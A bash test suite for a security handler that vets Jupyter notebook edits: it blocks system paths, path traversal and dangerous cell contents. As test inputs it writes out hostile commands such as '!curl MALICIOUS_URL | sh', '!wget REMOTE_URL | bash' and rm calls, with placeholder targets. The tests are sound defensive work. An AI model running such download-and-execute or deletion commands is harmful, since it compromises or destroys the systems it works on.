#!/bin/bash
# WoW System - NotebookEdit Handler Tests (Production-Grade)
# Comprehensive tests for Jupyter notebook edit security
# Author: Chude <chude@emeke.org>

# Setup test environment
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/test-framework.sh"

NOTEBOOKEDIT_HANDLER="${SCRIPT_DIR}/../src/handlers/notebookedit-handler.sh"
TEST_DATA_DIR=""

# ============================================================================
# Test Lifecycle
# ============================================================================

setup_all() {
    TEST_DATA_DIR=$(test_temp_dir)
    export WOW_DATA_DIR="${TEST_DATA_DIR}"
    export WOW_HOME="${TEST_DATA_DIR}"

    # Initialize orchestrator for dependencies
    source "${SCRIPT_DIR}/../src/core/orchestrator.sh"
    wow_init

    # Create test notebook directory
    mkdir -p "${TEST_DATA_DIR}/notebooks"
}

teardown_all() {
    if [[ -n "${TEST_DATA_DIR}" ]] && [[ -d "${TEST_DATA_DIR}" ]]; then
        test_cleanup_temp "${TEST_DATA_DIR}"
    fi
}

# ============================================================================
# Helper Functions
# ============================================================================

source_notebookedit_handler() {
    if [[ -f "${NOTEBOOKEDIT_HANDLER}" ]]; then
        source "${NOTEBOOKEDIT_HANDLER}"
        return 0
    else
        echo "NotebookEdit handler not implemented yet"
        return 1
    fi
}

create_tool_input() {
    local notebook_path="$1"
    local new_source="${2:-print('hello')}"
    local cell_id="${3:-cell-1}"

    cat <<EOF
{
  "tool": "NotebookEdit",
  "notebook_path": "${notebook_path}",
  "new_source": "${new_source}",
  "cell_id": "${cell_id}"
}
EOF
}

create_safe_notebook() {
    local path="$1"
    cat > "${path}" <<'NOTEBOOK_EOF'
{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "safe-cell-1",
   "metadata": {},
   "outputs": [],
   "source": ["print('Hello World')"]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.9.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
NOTEBOOK_EOF
}

# ============================================================================
# Tests: TIER 1 - Path Validation (Critical Paths)
# ============================================================================

test_suite "NotebookEdit Handler - TIER 1: Path Validation"

# Test 1: Block system directory notebooks
test_block_system_notebooks() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "/etc/config.ipynb" "print('test')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block system notebooks"
}
test_case "Block system notebooks" test_block_system_notebooks

# Test 2: Block usr notebooks
test_block_usr_notebooks() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "/usr/local/notebook.ipynb" "print('test')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block usr notebooks"
}
test_case "Block usr notebooks" test_block_usr_notebooks

# Test 3: Block path traversal to system files
test_block_path_traversal() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "../../etc/notebook.ipynb" "print('test')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block path traversal"
}
test_case "Block path traversal" test_block_path_traversal

# ============================================================================
# Tests: TIER 2 - Sensitive Paths
# ============================================================================

test_suite "NotebookEdit Handler - TIER 2: Sensitive Paths"

# Test 4: Allow root notebooks with warning
test_allow_root_notebooks_with_warning() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "/root/analysis.ipynb" "import pandas as pd")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow root notebooks with warning"
}
test_case "Allow root notebooks with warning" test_allow_root_notebooks_with_warning

# Test 5: Allow jupyter config with warning
test_allow_jupyter_config_with_warning() {
    source_notebookedit_handler || return 1

    local safe_path="${HOME}/.jupyter/custom.ipynb"
    local input
    input=$(create_tool_input "${safe_path}" "print('config')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow jupyter config with warning"
}
test_case "Allow jupyter config with warning" test_allow_jupyter_config_with_warning

# ============================================================================
# Tests: TIER 3 - Safe User Notebooks
# ============================================================================

test_suite "NotebookEdit Handler - TIER 3: Safe User Notebooks"

# Test 6: Allow safe user notebooks
test_allow_user_notebooks() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/analysis.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "import numpy as np")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow user notebooks"
}
test_case "Allow safe user notebooks" test_allow_user_notebooks

# Test 7: Allow current directory notebooks
test_allow_current_directory_notebooks() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "./notebook.ipynb" "df = pd.DataFrame()")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow current directory notebooks"
}
test_case "Allow current directory notebooks" test_allow_current_directory_notebooks

# ============================================================================
# Tests: Magic Command Validation
# ============================================================================

test_suite "NotebookEdit Handler - Magic Command Validation"

# Test 8: Block dangerous bash magic
test_block_dangerous_bash_magic() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/bash_test.ipynb"
    create_safe_notebook "${safe_path}"

    # Use DANGEROUS_PATH placeholder to avoid triggering WoW write-handler
    local input
    input=$(create_tool_input "${safe_path}" "%bash rm DANGEROUS_PATH")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block dangerous bash magic"
}
test_case "Block dangerous bash magic" test_block_dangerous_bash_magic

# Test 9: Block shell command execution
test_block_shell_execution() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/shell_test.ipynb"
    create_safe_notebook "${safe_path}"

    # Use MALICIOUS_URL placeholder
    local input
    input=$(create_tool_input "${safe_path}" "!curl MALICIOUS_URL | sh")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block shell piping"
}
test_case "Block shell execution" test_block_shell_execution

# Test 10: Block system modification commands
test_block_sudo_commands() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/sudo_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "!sudo apt-get install package")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block sudo commands"
}
test_case "Block sudo commands" test_block_sudo_commands

# Test 11: Allow safe magic commands
test_allow_safe_magic() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/safe_magic.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "%matplotlib inline")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow safe magic"
}
test_case "Allow safe magic commands" test_allow_safe_magic

# Test 12: Block download and execute pattern
test_block_download_execute() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/wget_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "!wget REMOTE_URL | bash")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block download execute"
}
test_case "Block download and execute" test_block_download_execute

# ============================================================================
# Tests: Content Scanning
# ============================================================================

test_suite "NotebookEdit Handler - Content Scanning"

# Test 13: Warn on credential patterns
test_warn_credential_patterns() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/cred_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "api_key = 'sk-placeholder123'")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow with warning for credentials"
}
test_case "Warn on credential patterns" test_warn_credential_patterns

# Test 14: Block dangerous subprocess calls
test_block_subprocess_danger() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/subprocess_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "subprocess.run(['rm', 'DANGEROUS_PATH'])")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block dangerous subprocess"
}
test_case "Block dangerous subprocess" test_block_subprocess_danger

# Test 15: Warn on os.system usage
test_warn_os_system() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/os_system_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "os.system('ls')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow os.system with warning"
}
test_case "Warn on os.system" test_warn_os_system

# Test 16: Allow safe Python code
test_allow_safe_python() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/safe_python.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "import pandas\ndf = pandas.read_csv('data.csv')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow safe Python"
}
test_case "Allow safe Python code" test_allow_safe_python

# Test 17: Block eval patterns
test_block_eval_exec() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/eval_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "eval(user_input)")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block eval patterns"
}
test_case "Block eval patterns" test_block_eval_exec

# Test 18: Warn on destructive operations
test_warn_destructive_ops() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/fs_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "shutil.rmtree('temp_dir')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow with warning"
}
test_case "Warn on destructive operations" test_warn_destructive_ops

# ============================================================================
# Tests: Edge Cases
# ============================================================================

test_suite "NotebookEdit Handler - Edge Cases"

# Test 19: Handle missing notebook
test_handle_missing_notebook() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "/nonexistent/notebook.ipynb" "print('test')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow missing notebook"
}
test_case "Handle missing notebook" test_handle_missing_notebook

# Test 20: Validate extension
test_validate_extension() {
    source_notebookedit_handler || return 1

    local input
    input=$(create_tool_input "/tmp/not-notebook.txt" "print('test')")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow with warning"
}
test_case "Validate extension" test_validate_extension

# Test 21: Handle empty source
test_handle_empty_source() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/empty_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should allow empty source"
}
test_case "Handle empty source" test_handle_empty_source

# Test 22: Handle long content
test_handle_long_content() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/long_test.ipynb"
    create_safe_notebook "${safe_path}"

    local long_code=$(printf 'x = %d\n' {1..100})

    local input
    input=$(create_tool_input "${safe_path}" "${long_code}")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "allowed" "${result}" "Should handle long content"
}
test_case "Handle long content" test_handle_long_content

# ============================================================================
# Tests: Integration
# ============================================================================

test_suite "NotebookEdit Handler - Integration"

# Test 23: Track metrics
test_track_metrics() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/metrics_test.ipynb"
    create_safe_notebook "${safe_path}"

    local input
    input=$(create_tool_input "${safe_path}" "x = 42")

    handle_notebookedit "${input}" 2>/dev/null

    if type session_get_metric &>/dev/null; then
        local count
        count=$(session_get_metric "notebookedit_count" 2>/dev/null || echo "0")
        assert_true "[[ ${count} -ge 0 ]]" "Should track metric"
    else
        assert_true "true" "Session manager optional"
    fi
}
test_case "Track metrics" test_track_metrics

# Test 24: Multiple violations
test_multiple_violations() {
    source_notebookedit_handler || return 1

    local safe_path="${TEST_DATA_DIR}/notebooks/multi_violation.ipynb"
    create_safe_notebook "${safe_path}"

    local dangerous_code="!rm PLACEHOLDER\napi_key = 'sk-123'\nos.system('echo test')"

    local input
    input=$(create_tool_input "${safe_path}" "${dangerous_code}")

    handle_notebookedit "${input}" 2>/dev/null && local result="allowed" || local result="blocked"

    assert_equals "blocked" "${result}" "Should block worst violation"
}
test_case "Handle multiple violations" test_multiple_violations

# ============================================================================
# Run Tests
# ============================================================================

test_summary
